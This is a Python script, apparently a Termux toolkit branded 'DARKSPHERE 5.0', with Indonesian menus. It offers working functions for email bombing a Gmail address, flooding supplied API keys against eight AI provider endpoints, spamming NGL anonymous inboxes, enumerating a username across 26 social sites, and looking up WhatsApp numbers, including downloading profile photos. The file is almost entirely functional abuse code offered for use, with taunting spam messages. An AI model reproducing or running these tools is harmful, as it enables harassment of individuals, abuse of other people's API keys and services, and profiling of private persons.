import os
import sys
import time
import random
import requests
import smtplib
import json
import platform
import subprocess
from email.mime.text import MIMEText
from email.mime.multipart import MIMEMultipart
from datetime import datetime

# ============================================================
# WARNA
# ============================================================
R = '\033[91m'
B = '\033[1m'
W = '\033[0m'
G = '\033[92m'
C = '\033[96m'
Y = '\033[93m'
M = '\033[95m'

# ============================================================
# KONFIGURASI (LOAD DARI FILE)
# ============================================================
CONFIG_FILE = "config.json"

def load_config():
    if os.path.exists(CONFIG_FILE):
        with open(CONFIG_FILE, "r") as f:
            return json.load(f)
    return {}

def save_config(data):
    with open(CONFIG_FILE, "w") as f:
        json.dump(data, f, indent=4)

config = load_config()

EMAIL_SENDER = config.get("email", {}).get("sender", "")
EMAIL_PASS = config.get("email", {}).get("app_password", "")
SMTP_SERVER = config.get("email", {}).get("smtp_server", "smtp.gmail.com")
SMTP_PORT = config.get("email", {}).get("smtp_port", 587)

# ============================================================
# KONFIGURASI API SPAM
# ============================================================
API_CONFIG = {
    "delay": 0.01,
    "max_requests_per_key": 100,
    "targets": [
        {"name": "Groq", "url": "https://api.groq.com/openai/v1/chat/completions", "model": "llama-3.3-70b-versatile"},
        {"name": "OpenAI", "url": "https://api.openai.com/v1/chat/completions", "model": "gpt-3.5-turbo"},
        {"name": "Gemini", "url": "https://generativelanguage.googleapis.com/v1/models/gemini-pro:generateContent"},
        {"name": "Claude", "url": "https://api.anthropic.com/v1/messages", "model": "claude-3-haiku-20240307"},
        {"name": "Mistral", "url": "https://api.mistral.ai/v1/chat/completions", "model": "mistral-small-latest"},
        {"name": "Cohere", "url": "https://api.cohere.ai/v1/generate", "model": "command"},
        {"name": "DeepSeek", "url": "https://api.deepseek.com/v1/chat/completions", "model": "deepseek-chat"},
        {"name": "HuggingFace", "url": "https://api-inference.huggingface.co/models/mistralai/Mistral-7B-Instruct-v0.1"},
    ]
}

# ============================================================
# DAFTAR PLATFORM SOSMED
# ============================================================
SOSMED_SITES = [
    {"name": "Instagram", "url": "https://www.instagram.com/{}"},
    {"name": "Twitter/X", "url": "https://twitter.com/{}"},
    {"name": "TikTok", "url": "https://www.tiktok.com/@{}"},
    {"name": "YouTube", "url": "https://www.youtube.com/@{}"},
    {"name": "GitHub", "url": "https://github.com/{}"},
    {"name": "Reddit", "url": "https://www.reddit.com/user/{}"},
    {"name": "Pinterest", "url": "https://www.pinterest.com/{}"},
    {"name": "Spotify", "url": "https://open.spotify.com/user/{}"},
    {"name": "Snapchat", "url": "https://www.snapchat.com/add/{}"},
    {"name": "Telegram", "url": "https://t.me/{}"},
    {"name": "Facebook", "url": "https://www.facebook.com/{}"},
    {"name": "LinkedIn", "url": "https://www.linkedin.com/in/{}"},
    {"name": "Twitch", "url": "https://www.twitch.tv/{}"},
    {"name": "Discord", "url": "https://discord.com/users/{}"},
    {"name": "Medium", "url": "https://medium.com/@{}"},
    {"name": "Dev.to", "url": "https://dev.to/{}"},
    {"name": "SoundCloud", "url": "https://soundcloud.com/{}"},
    {"name": "Vimeo", "url": "https://vimeo.com/{}"},
    {"name": "Flickr", "url": "https://www.flickr.com/people/{}"},
    {"name": "Tumblr", "url": "https://{}.tumblr.com"},
    {"name": "Patreon", "url": "https://www.patreon.com/{}"},
    {"name": "OnlyFans", "url": "https://onlyfans.com/{}"},
    {"name": "VK", "url": "https://vk.com/{}"},
    {"name": "WeChat", "url": "https://www.wechat.com/{}"},
    {"name": "Line", "url": "https://line.me/ti/p/{}"},
    {"name": "Signal", "url": "https://signal.me/#p/{}"},
]

# ============================================================
# FUNGSI CLEAR SCREEN
# ============================================================
def clear():
    os.system('clear' if os.name == 'posix' else 'cls')

# ============================================================
# INFO DEVICE
# ============================================================
def info_device():
    clear()
    banner()
    print(f"{R}[0] INFO DEVICE{W}\n")

    print(f"{C}{B}═══════════════════════════════════════════{W}")
    print(f"{G}📱 INFORMASI PERANGKAT{W}")
    print(f"{C}{B}═══════════════════════════════════════════{W}\n")

    print(f"{Y}🖥️  Sistem Operasi   : {G}{platform.system()} {platform.release()}{W}")
    print(f"{Y}💻  Arsitektur       : {G}{platform.machine()}{W}")
    print(f"{Y}🐍  Python Version   : {G}{platform.python_version()}{W}")
    print(f"{Y}📦  Hostname         : {G}{platform.node()}{W}")
    print(f"{Y}🧠  Processor        : {G}{platform.processor() or 'N/A'}{W}")
    print(f"{Y}📂  Working Dir      : {G}{os.getcwd()}{W}")
    print(f"{Y}👤  User             : {G}{os.getenv('USER', 'N/A')}{W}")

    # Termux info
    try:
        termux_info = subprocess.check_output(['pkg', 'list-installed'], text=True, stderr=subprocess.DEVNULL)
        pkg_count = len(termux_info.splitlines())
        print(f"{Y}📦  Termux Packages  : {G}{pkg_count}{W}")
    except:
        print(f"{Y}📦  Termux Packages  : {R}N/A (not Termux){W}")

    # Memory info (Linux)
    try:
        mem_info = subprocess.check_output(['free', '-h'], text=True).splitlines()
        for line in mem_info:
            if 'Mem:' in line:
                parts = line.split()
                print(f"{Y}🧠  Memory Total     : {G}{parts[1]}{W}")
                print(f"{Y}🧠  Memory Used      : {G}{parts[2]}{W}")
                print(f"{Y}🧠  Memory Free      : {G}{parts[3]}{W}")
                break
    except:
        pass

    # Uptime
    try:
        uptime = subprocess.check_output(['uptime', '-p'], text=True).strip()
        print(f"{Y}⏱️  Uptime           : {G}{uptime}{W}")
    except:
        pass

    # IP Publik
    try:
        ip = requests.get('https://api.ipify.org', timeout=5).text
        print(f"{Y}🌐  IP Publik        : {G}{ip}{W}")
    except:
        print(f"{Y}🌐  IP Publik        : {R}Gagal获取{W}")

    print(f"\n{C}{B}═══════════════════════════════════════════{W}")

    input(f"\n{R}[ENTER] Kembali ke menu...{W}")

# ============================================================
# BANNER
# ============================================================
def banner():
    clear()

    from datetime import datetime
    import platform

    today = datetime.now().strftime("%d-%m-%Y")

    print(f"""{R}{B}
╔══════════════════════════════════════════════════╗
║               𝑫𝑨𝑹𝑲𝑺𝑷𝑯𝑬𝑹𝑬 5.0                     ║
╠══════════════════════════════════════════════════╣
║ Developer : {W}LEXZY{R}                                ║
║ Designer  : {W}LEXZY{R}                                ║
║ Version   : {W}5.0{R}                                  ║
║ Users     : {W}17{R}                                   ║
║ Date      : {W}{today}{R}                           ║
║ Python    : {W}{platform.python_version()}{R}                               ║
║ OS        : {W}{platform.system()} {platform.release()}{R}                           ║
╚══════════════════════════════════════════════════╝
{W}""")

# ============================================================
# ADD SENDER
# ============================================================
def add_sender():
    clear()
    banner()
    print(f"{R}[8] ADD SENDER{W}\n")

    email = input(f"{R}[?] Masukkan Email Sender : {W}").strip()
    if not email:
        print(f"{R}[x] Email tidak boleh kosong!{W}")
        input(f"\n{R}[ENTER] Kembali...{W}")
        return

    app_pass = input(f"{R}[?] Masukkan App Password : {W}").strip()
    if not app_pass:
        print(f"{R}[x] App Password tidak boleh kosong!{W}")
        input(f"\n{R}[ENTER] Kembali...{W}")
        return

    config["email"] = {
        "sender": email,
        "app_password": app_pass,
        "smtp_server": "smtp.gmail.com",
        "smtp_port": 587
    }
    save_config(config)

    global EMAIL_SENDER, EMAIL_PASS
    EMAIL_SENDER = email
    EMAIL_PASS = app_pass

    print(f"{G}[✓] Sender berhasil disimpan!{W}")
    print(f"{C}📧 Email: {email}{W}")
    print(f"{C}🔑 App Password: {app_pass[:4]}...{app_pass[-4:]}{W}")
    input(f"\n{R}[ENTER] Kembali ke menu...{W}")

# ============================================================
# SHOW SENDER (RAPI)
# ============================================================
def show_sender():
    clear()
    banner()
    print(f"{R}[9] SHOW SENDER{W}\n")

    print(f"{C}{B}═══════════════════════════════════════════{W}")
    print(f"{G}📧 INFORMASI SENDER{W}")
    print(f"{C}{B}═══════════════════════════════════════════{W}\n")

    if EMAIL_SENDER and EMAIL_PASS:
        print(f"{Y}📧 Email Sender    : {G}{EMAIL_SENDER}{W}")
        print(f"{Y}🔑 App Password    : {G}{EMAIL_PASS[:4]}...{EMAIL_PASS[-4:]}{W}")
        print(f"{Y}📡 SMTP Server     : {G}{SMTP_SERVER}{W}")
        print(f"{Y}🔌 SMTP Port       : {G}{SMTP_PORT}{W}")
        print(f"{Y}📁 Config File     : {G}{CONFIG_FILE}{W}")
        print(f"{Y}📅 Last Updated    : {G}{datetime.now().strftime('%Y-%m-%d %H:%M:%S')}{W}")
    else:
        print(f"{R}❌ Belum ada sender yang dikonfigurasi!{W}")
        print(f"{Y}Silakan tambahkan sender lewat menu [8] ADD SENDER{W}")

    print(f"\n{C}{B}═══════════════════════════════════════════{W}")

    input(f"\n{R}[ENTER] Kembali ke menu...{W}")

# ============================================================
# SPAM EMAIL
# ============================================================
def spam_email():
    clear()
    banner()
    print(f"{R}[1] SPAM EMAIL{W}\n")

    if not EMAIL_SENDER or not EMAIL_PASS:
        print(f"{R}[x] Sender belum diatur!{W}")
        print(f"{Y}Silakan tambahkan sender lewat menu [8] ADD SENDER{W}")
        input(f"\n{R}[ENTER] Kembali...{W}")
        return

    username = input(f"{R}[?] Masukkan username email (contoh: tes) : {W}").strip()
    if not username:
        print(f"{R}[x] Username tidak boleh kosong!{W}")
        input(f"\n{R}[ENTER] Kembali...{W}")
        return

    target = username + "@gmail.com"

    count = input(f"{R}[?] Jumlah spam (default 50) : {W}").strip()
    count = int(count) if count else 50

    subject = "KENA SPAM YA😈?"
    body = "𝑫𝑨𝑹𝑲𝑺𝑷𝑯𝑬𝑹𝑬" * 5

    print(f"\n{R}[+] Mengirim {count} spam ke {target}...{W}")

    sys.stdout.write(f"{R}⏳ Proses spam...{W}")
    sys.stdout.flush()

    try:
        server = smtplib.SMTP(SMTP_SERVER, SMTP_PORT)
        server.starttls()
        server.login(EMAIL_SENDER, EMAIL_PASS)

        for i in range(count):
            msg = MIMEMultipart()
            msg['From'] = EMAIL_SENDER
            msg['To'] = target
            msg['Subject'] = subject
            msg.attach(MIMEText(body, 'plain'))
            server.send_message(msg)
            time.sleep(0.08)

        server.quit()
        sys.stdout.write("\r\033[K")
        print(f"{R}✅ Done spam to {target} 😈{W}")

    except Exception as e:
        sys.stdout.write("\r\033[K")
        print(f"{R}[x] Error: {e}{W}")

    input(f"\n{R}[ENTER] Kembali ke menu...{W}")

# ============================================================
# SPAM API KEY AI
# ============================================================
def get_ai_reply(target_name, key):
    replies = [
        f"[!] API Key Anda ({key[:8]}...) terkena spam dari DARKSPHERE!",
        f"[!] Hubungi admin untuk reset key {target_name} Anda!",
        f"[!] - DARKSPHERE",
        f"[!] {target_name} API Key telah dinonaktifkan sementara.",
        f"[!] Spam detected! Your {target_name} key is now blacklisted.",
        f"[!] Selamat! API Key Anda berhasil di-spam oleh LEXZY.",
        f"[!] {target_name} key: {key[:12]}... telah mencapai batas maksimum."
    ]
    return random.choice(replies)

def build_payload(target, key):
    payloads = {
        "Groq": {"model": target["model"], "messages": [{"role": "user", "content": f"Spam test {time.time()}"}], "temperature": 0.7, "max_tokens": 10},
        "OpenAI": {"model": target["model"], "messages": [{"role": "user", "content": f"Spam test {time.time()}"}], "temperature": 0.7, "max_tokens": 10},
        "Gemini": {"contents": [{"parts": [{"text": f"Spam test {time.time()}"}]}]},
        "Claude": {"model": target["model"], "messages": [{"role": "user", "content": f"Spam test {time.time()}"}], "max_tokens": 10},
        "Mistral": {"model": target["model"], "messages": [{"role": "user", "content": f"Spam test {time.time()}"}], "temperature": 0.7, "max_tokens": 10},
        "Cohere": {"model": target["model"], "prompt": f"Spam test {time.time()}", "max_tokens": 10},
        "DeepSeek": {"model": target["model"], "messages": [{"role": "user", "content": f"Spam test {time.time()}"}], "temperature": 0.7, "max_tokens": 10},
        "HuggingFace": {"inputs": f"Spam test {time.time()}"}
    }
    return payloads.get(target["name"], {})

def get_headers(target, key):
    headers = {
        "Groq": {"Authorization": f"Bearer {key}", "Content-Type": "application/json"},
        "OpenAI": {"Authorization": f"Bearer {key}", "Content-Type": "application/json"},
        "Gemini": {"x-goog-api-key": key, "Content-Type": "application/json"},
        "Claude": {"x-api-key": key, "Content-Type": "application/json", "anthropic-version": "2023-06-01"},
        "Mistral": {"Authorization": f"Bearer {key}", "Content-Type": "application/json"},
        "Cohere": {"Authorization": f"Bearer {key}", "Content-Type": "application/json"},
        "DeepSeek": {"Authorization": f"Bearer {key}", "Content-Type": "application/json"},
        "HuggingFace": {"Authorization": f"Bearer {key}"}
    }
    return headers.get(target["name"], {})

def spam_api():
    clear()
    banner()
    print(f"{R}[2] SPAM APIKEY AI{W}\n")

    key_file = input(f"{R}[?] File keys.txt (enter untuk input manual) : {W}").strip()
    keys = []

    if key_file and os.path.exists(key_file):
        with open(key_file, "r") as f:
            keys = [line.strip() for line in f if line.strip() and not line.startswith("#")]
    else:
        print(f"{R}\nMasukkan API Key satu per baris. Ketik 'done' untuk selesai:{W}")
        while True:
            line = input(f"{R}> {W}").strip()
            if line.lower() == "done":
                break
            if line:
                keys.append(line)

    if not keys:
        print(f"{R}[x] Tidak ada API Key!{W}")
        input(f"\n{R}[ENTER] Kembali...{W}")
        return

    print(f"\n{R}[+] {len(keys)} API Key ditemukan. Memulai spam...{W}\n")

    for key in keys:
        for target in API_CONFIG["targets"]:
            print(f"{R}[{target['name']}] Spamming with key: {key[:8]}...{W}")
            for i in range(API_CONFIG["max_requests_per_key"]):
                try:
                    payload = build_payload(target, key)
                    headers = get_headers(target, key)
                    response = requests.post(target["url"], json=payload, headers=headers, timeout=5)
                    print(f"{R}[{target['name']}] Req {i+1}/{API_CONFIG['max_requests_per_key']} -> {response.status_code}{W}")

                    if response.status_code in [401, 403]:
                        print(f"{R}[{target['name']}] [x] API Key mati!{W}")
                        print(f"{R}[+] Balasan: {get_ai_reply(target['name'], key)}{W}\n")
                        break

                    if response.status_code != 200:
                        error_msg = response.json().get("error", {}).get("message", "Unknown")
                        print(f"{R}[{target['name']}] [!] Error: {error_msg}{W}")

                except Exception as e:
                    print(f"{R}[{target['name']}] [!] Error: {e}{W}")
                    if "401" in str(e) or "403" in str(e):
                        print(f"{R}[{target['name']}] [x] API Key mati!{W}")
                        break

                time.sleep(API_CONFIG["delay"])

    print(f"\n{R}[✓] Spam API selesai!{W}")
    input(f"\n{R}[ENTER] Kembali ke menu...{W}")

# ============================================================
# OSINT - CARI AKUN SOSMED
# ============================================================
def osint_search():
    clear()
    banner()
    print(f"{R}[3] OSINT - CARI AKUN SOSMED{W}\n")

    username = input(f"{R}[?] Masukkan username : {W}").strip()
    if not username:
        print(f"{R}[x] Username tidak boleh kosong!{W}")
        input(f"\n{R}[ENTER] Kembali...{W}")
        return

    print(f"\n{R}[+] Mencari akun dengan username '{username}' ...{W}\n")
    time.sleep(1)

    found = []
    not_found = []

    for site in SOSMED_SITES:
        url = site["url"].format(username)
        try:
            response = requests.get(url, timeout=5, headers={"User-Agent": "Mozilla/5.0"})
            if response.status_code == 200:
                found.append({"name": site["name"], "url": url})
                print(f"{G}[✓] {site['name']} : {url}{W}")
            else:
                not_found.append(site["name"])
                print(f"{R}[✗] {site['name']} : Tidak ditemukan{W}")
        except Exception as e:
            not_found.append(site["name"])
            print(f"{R}[✗] {site['name']} : Error - {str(e)[:30]}{W}")

        time.sleep(0.3)

    print(f"\n{R}{B}═══════════════════════════════════════════{W}")
    print(f"{G}[✓] Ditemukan : {len(found)} akun{W}")
    print(f"{R}[✗] Tidak ditemukan : {len(not_found)} akun{W}")
    print(f"{R}{B}═══════════════════════════════════════════{W}\n")

    if found:
        print(f"{G}📋 Daftar Akun Ditemukan:{W}")
        for f in found:
            print(f"{C}  • {f['name']} : {f['url']}{W}")

    input(f"\n{R}[ENTER] Kembali ke menu...{W}")

# ============================================================
# SPAM NGL
# ============================================================
def spam_ngl():
    clear()
    banner()
    print(f"{R}[4] SPAM NGL{W}\n")

    link = input(f"{R}[?] Masukkan link NGL (contoh: https://ngl.link/username) : {W}").strip()
    if not link:
        print(f"{R}[x] Link tidak boleh kosong!{W}")
        input(f"\n{R}[ENTER] Kembali...{W}")
        return

    if "ngl.link/" in link:
        username = link.split("ngl.link/")[-1].split("?")[0]
    else:
        username = link

    message = input(f"{R}[?] Masukkan pesan spam : {W}").strip()
    if not message:
        print(f"{R}[x] Pesan tidak boleh kosong!{W}")
        input(f"\n{R}[ENTER] Kembali...{W}")
        return

    count = input(f"{R}[?] Jumlah spam (default 10) : {W}").strip()
    count = int(count) if count else 10

    print(f"\n{R}[+] Mengirim {count} spam ke @{username} ...{W}\n")

    success = 0
    failed = 0

    for i in range(count):
        try:
            encoded_link = requests.utils.quote(f"https://ngl.link/{username}")
            encoded_msg = requests.utils.quote(message)
            api_url = f"https://api.synoxcloud.xyz/tools/spam-ngl?link={encoded_link}&message={encoded_msg}&jumlah=1"

            response = requests.get(api_url, timeout=10)

            if response.status_code == 200:
                data = response.json()
                if data.get("status") == True:
                    success += 1
                    print(f"{G}[{i+1}/{count}] ✅ Spam terkirim ke @{username}{W}")
                else:
                    failed += 1
                    print(f"{R}[{i+1}/{count}] ❌ Gagal: {data.get('message', 'Unknown error')}{W}")
            else:
                failed += 1
                print(f"{R}[{i+1}/{count}] ❌ HTTP Error: {response.status_code}{W}")

        except Exception as e:
            failed += 1
            print(f"{R}[{i+1}/{count}] ❌ Error: {e}{W}")

        time.sleep(0.5)

    print(f"\n{R}{B}═══════════════════════════════════════════{W}")
    print(f"{G}[✓] Berhasil : {success}{W}")
    print(f"{R}[✗] Gagal : {failed}{W}")
    print(f"{R}{B}═══════════════════════════════════════════{W}")

    input(f"\n{R}[ENTER] Kembali ke menu...{W}")

# ============================================================
# CEK WHATSAPP
# ============================================================
def cek_wa():
    clear()
    banner()
    print(f"{R}[5] CEK WHATSAPP{W}\n")

    nomor = input(f"{R}[?] Masukkan nomor (contoh: 08123456789) : {W}").strip()
    if not nomor:
        print(f"{R}[x] Nomor tidak boleh kosong!{W}")
        input(f"\n{R}[ENTER] Kembali...{W}")
        return

    if nomor.startswith("0"):
        nomor = "62" + nomor[1:]
    elif not nomor.startswith("62"):
        nomor = "62" + nomor

    print(f"\n{R}[+] Mengecek nomor {nomor} ...{W}\n")

    try:
        api_url = f"https://api.synoxcloud.xyz/check/cekwa?nomor={nomor}"
        response = requests.get(api_url, timeout=10)

        if response.status_code == 200:
            data = response.json()
            if data.get("status") == True:
                result = data.get("result", {})
                print(f"{G}✅ Status: Terdaftar di WhatsApp{W}")
                print(f"{C}📱 Nomor: {result.get('number', nomor)}{W}")
                print(f"{C}🆔 WhatsApp ID: {result.get('jid', 'Tidak tersedia')}{W}")
                print(f"{C}👤 Nama: {result.get('name', 'Tidak tersedia')}{W}")

                photo = result.get('photo', '')
                if photo and photo.startswith('http'):
                    print(f"{C}🖼️ Foto Profil: {photo}{W}")
                    download = input(f"{R}[?] Download foto profil? (y/n) : {W}").strip().lower()
                    if download == 'y':
                        try:
                            img_response = requests.get(photo, timeout=10)
                            if img_response.status_code == 200:
                                filename = f"wa_profile_{nomor}.jpg"
                                with open(filename, 'wb') as f:
                                    f.write(img_response.content)
                                print(f"{G}✅ Foto disimpan: {filename}{W}")
                            else:
                                print(f"{R}[x] Gagal download foto!{W}")
                        except Exception as e:
                            print(f"{R}[x] Error download foto: {e}{W}")
                else:
                    print(f"{R}🖼️ Foto Profil: Tidak tersedia{W}")
            else:
                print(f"{R}❌ Nomor tidak terdaftar di WhatsApp{W}")
                print(f"{R}Message: {data.get('message', 'Unknown')}{W}")
        else:
            print(f"{R}[x] HTTP Error: {response.status_code}{W}")

    except requests.exceptions.Timeout:
        print(f"{R}[x] Timeout! Server tidak merespon.{W}")
    except Exception as e:
        print(f"{R}[x] Error: {e}{W}")

    input(f"\n{R}[ENTER] Kembali ke menu...{W}")

# ============================================================
# DETEKSI SITEKEY
# ============================================================
def deteksi_sitekey():
    clear()
    banner()
    print(f"{R}[6] DETEKSI SITEKEY{W}\n")

    url = input(f"{R}[?] Masukkan URL (contoh: https://example.com) : {W}").strip()
    if not url:
        print(f"{R}[x] URL tidak boleh kosong!{W}")
        input(f"\n{R}[ENTER] Kembali...{W}")
        return

    print(f"\n{R}[+] Mengecek CAPTCHA di {url} ...{W}\n")

    try:
        encoded_url = requests.utils.quote(url)
        api_url = f"https://api.synoxcloud.xyz/tools/get-sitekey?url={encoded_url}"
        response = requests.get(api_url, timeout=10)

        if response.status_code == 200:
            data = response.json()
            if data.get("status") == True:
                result = data.get("result", {})
                found = result.get("found", False)
                message = data.get("message", "Tidak ada informasi")

                if found:
                    print(f"{G}✅ CAPTCHA DITEMUKAN!{W}")
                    print(f"{C}📌 URL: {result.get('url', url)}{W}")
                    print(f"{C}🔑 reCAPTCHA Sitekey: {result.get('sitekey', 'Tidak ada') or 'Tidak ditemukan'}{W}")
                    print(f"{C}🔑 hCaptcha Sitekey: {result.get('hcaptcha', 'Tidak ada') or 'Tidak ditemukan'}{W}")
                    print(f"{C}🔑 Turnstile Sitekey: {result.get('turnstile', 'Tidak ada') or 'Tidak ditemukan'}{W}")

                    if result.get('sitekey'):
                        print(f"{G}📋 Sitekey ditemukan: {result['sitekey']}{W}")
                    elif result.get('hcaptcha'):
                        print(f"{G}📋 Sitekey ditemukan (hCaptcha): {result['hcaptcha']}{W}")
                    elif result.get('turnstile'):
                        print(f"{G}📋 Sitekey ditemukan (Turnstile): {result['turnstile']}{W}")
                else:
                    print(f"{R}❌ Tidak ditemukan CAPTCHA di halaman tersebut{W}")
                    print(f"{R}Message: {message}{W}")

                print(f"{Y}🕐 Timestamp: {data.get('timestamp', 'N/A')}{W}")
            else:
                print(f"{R}[x] Gagal mendeteksi sitekey!{W}")
                print(f"{R}Response: {data}{W}")
        else:
            print(f"{R}[x] HTTP Error: {response.status_code}{W}")

    except requests.exceptions.Timeout:
        print(f"{R}[x] Timeout! Server tidak merespon.{W}")
    except Exception as e:
        print(f"{R}[x] Error: {e}{W}")

    input(f"\n{R}[ENTER] Kembali ke menu...{W}")

# ============================================================
# CEK KUOTA
# ============================================================
def cek_kuota():
    clear()
    banner()
    print(f"{R}[7] CEK KUOTA{W}\n")

    nomor = input(f"{R}[?] Masukkan nomor (contoh: 08123456789) : {W}").strip()
    if not nomor:
        print(f"{R}[x] Nomor tidak boleh kosong!{W}")
        input(f"\n{R}[ENTER] Kembali...{W}")
        return

    if nomor.startswith("0"):
        nomor = "62" + nomor[1:]
    elif not nomor.startswith("62"):
        nomor = "62" + nomor

    print(f"\n{R}[+] Mengecek kuota untuk nomor {nomor} ...{W}\n")

    try:
        api_url = f"https://api.synoxcloud.xyz/provider/cekkuota?nomor={nomor}"
        response = requests.get(api_url, timeout=10)

        if response.status_code == 200:
            data = response.json()
            if data.get("status") == True:
                result = data.get("result", {})
                print(f"{G}✅ Informasi Kuota ditemukan!{W}")
                print(f"{C}📱 Nomor: {nomor}{W}")

                if isinstance(result, dict):
                    for key, value in result.items():
                        if isinstance(value, dict):
                            print(f"{C}📦 {key.capitalize()}:{W}")
                            for sub_key, sub_value in value.items():
                                print(f"   {Y}{sub_key}: {sub_value}{W}")
                        else:
                            print(f"{C}📦 {key.capitalize()}: {value}{W}")
                elif isinstance(result, list):
                    for item in result:
                        print(f"{C}📦 {item}{W}")
                else:
                    print(f"{C}📦 {result}{W}")
            else:
                print(f"{R}❌ Gagal mendapatkan informasi kuota!{W}")
                print(f"{R}Message: {data.get('message', 'Unknown error')}{W}")
        elif response.status_code == 400:
            print(f"{R}[x] Error 400: Bad Request. Pastikan nomor yang dimasukkan benar.{W}")
            print(f"{R}Response: {response.text}{W}")
        else:
            print(f"{R}[x] HTTP Error: {response.status_code}{W}")

    except requests.exceptions.Timeout:
        print(f"{R}[x] Timeout! Server tidak merespon.{W}")
    except Exception as e:
        print(f"{R}[x] Error: {e}{W}")

    input(f"\n{R}[ENTER] Kembali ke menu...{W}")

# ============================================================
# GET CODE HTML
# ============================================================
def get_code_html():
    clear()
    banner()
    print(f"{R}[10] GET CODE HTML{W}\n")

    url = input(f"{R}[?] Masukkan URL (contoh: https://example.com) : {W}").strip()
    if not url:
        print(f"{R}[x] URL tidak boleh kosong!{W}")
        input(f"\n{R}[ENTER] Kembali...{W}")
        return

    print(f"\n{R}[+] Mengambil source code dari {url} ...{W}\n")

    try:
        encoded_url = requests.utils.quote(url)
        api_url = f"https://api.synoxcloud.xyz/tools/getcodehtml?url={encoded_url}"
        response = requests.get(api_url, timeout=10)

        if response.status_code == 200:
            data = response.json()
            if data.get("status") == True:
                result = data.get("result", {})
                source_code = result.get("source", "Tidak ada source code")
                print(f"{G}✅ Status: {data.get('statusCode')}{W}")
                print(f"{G}✅ Creator: {data.get('creator')}{W}")
                print(f"{G}✅ Timestamp: {data.get('timestamp')}{W}")
                print(f"\n{C}{B}═══════════════════════════════════════════{W}")
                print(f"{G}📄 SOURCE CODE:{W}\n")
                print(f"{Y}{source_code}{W}")
                print(f"\n{C}{B}═══════════════════════════════════════════{W}")
            else:
                print(f"{R}[x] Gagal mengambil source code!{W}")
                print(f"{R}Response: {data}{W}")
        else:
            print(f"{R}[x] HTTP Error: {response.status_code}{W}")

    except requests.exceptions.Timeout:
        print(f"{R}[x] Timeout! Server tidak merespon.{W}")
    except Exception as e:
        print(f"{R}[x] Error: {e}{W}")

    input(f"\n{R}[ENTER] Kembali ke menu...{W}")

# ============================================================
# MAIN MENU
# ============================================================
def main():
    while True:
        clear()
        banner()
        print(f"{R}  {B}[00]{W} {R}INFO DEVICE")
        print(f"{R}  {B}[01]{W} {R}SPAM EMAIL")
        print(f"{R}  {B}[02]{W} {R}SPAM APIKEY AI")
        print(f"{R}  {B}[03]{W} {R}OSINT")
        print(f"{R}  {B}[04]{W} {R}SPAM NGL")
        print(f"{R}  {B}[05]{W} {R}CEK WHATSAPP")
        print(f"{R}  {B}[06]{W} {R}DETEKSI SITEKEY")
        print(f"{R}  {B}[07]{W} {R}CEK KUOTA")
        print(f"{R}  {B}[08]{W} {R}ADD SENDER")
        print(f"{R}  {B}[09]{W} {R}SHOW SENDER")
        print(f"{R}  {B}[10]{W} {R}GET CODE HTML")
        print(f"{R}  {B}[11]{W} {R}EXIT{W}")
        print("")
        choice = input(f"{R}[?] Pilih menu: {W}").strip()

        if choice == "0":
            info_device()
        elif choice == "1":
            spam_email()
        elif choice == "2":
            spam_api()
        elif choice == "3":
            osint_search()
        elif choice == "4":
            spam_ngl()
        elif choice == "5":
            cek_wa()
        elif choice == "6":
            deteksi_sitekey()
        elif choice == "7":
            cek_kuota()
        elif choice == "8":
            add_sender()
        elif choice == "9":
            show_sender()
        elif choice == "10":
            get_code_html()
        elif choice == "11":
            print(f"{R}[+] Keluar...{W}")
            break
        else:
            print(f"{R}[x] Pilihan tidak valid!{W}")
            time.sleep(1)

if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        print(f"\n{R}[x] Dibatalkan oleh user.{W}")
